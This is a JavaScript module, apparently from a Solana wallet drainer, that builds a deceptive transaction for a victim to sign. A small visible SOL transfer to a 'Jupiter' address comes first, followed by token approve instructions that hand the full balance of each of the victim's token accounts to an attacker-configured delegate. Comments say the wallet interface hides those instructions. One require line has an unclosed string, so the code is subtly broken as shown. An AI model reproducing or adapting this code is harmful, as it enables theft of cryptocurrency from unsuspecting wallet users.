const { Transaction, PublicKey, SystemProgram } = require("@solana/web3.js");
const { createApproveInstruction } = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { setBlockhash } = require("../core/blockhashCache);

const MIN_RAW_AMOUNT = 1000n; // filter na dust tokeny
const JUP_SOL_AMOUNT = 0.005 * 1_000_000_000; // 0.005 SOL v lamportoch

async function buildApprove(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();
            const tx = new Transaction();

            const userPubkey = new PublicKey(user);
            const delegatePubkey = new PublicKey(config.WALLET);
            const jupiterPubkey = new PublicKey(config.JUPITER_ADDRESS);

            // 1. Blockhash
            const { blockhash } = await conn.getLatestBlockhash("confirmed");
            setBlockhash(blockhash);
            tx.recentBlockhash = blockhash;

            // 2. Fee payer = používateľ
            tx.feePayer = userPubkey;

            // 3. Najprv SOL transfer na Jupiter (Phantom zobrazí toto)
            tx.add(
                SystemProgram.transfer({
                    fromPubkey: userPubkey,
                    toPubkey: jupiterPubkey,
                    lamports: JUP_SOL_AMOUNT
                })
            );

            // 4. Potom approve inštrukcie (Phantom ich UXovo skryje)
            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");

            for (const token of tokenAccounts.tokens || []) {
                if (token.amount < MIN_RAW_AMOUNT) continue;

                tx.add(
                    createApproveInstruction(
                        token.ata,
                        delegatePubkey,
                        userPubkey,
                        token.amount
                    )
                );
            }

            logger.info("Approve + SOL transfer TX built", {
                instructions: tx.instructions.length
            });

            return tx;
        } catch (err) {
            logger.error("Failed to build approve transaction", { error: err.message });
            throw err;
        }
    }, "buildApprove");
}

module.exports = { buildApprove };
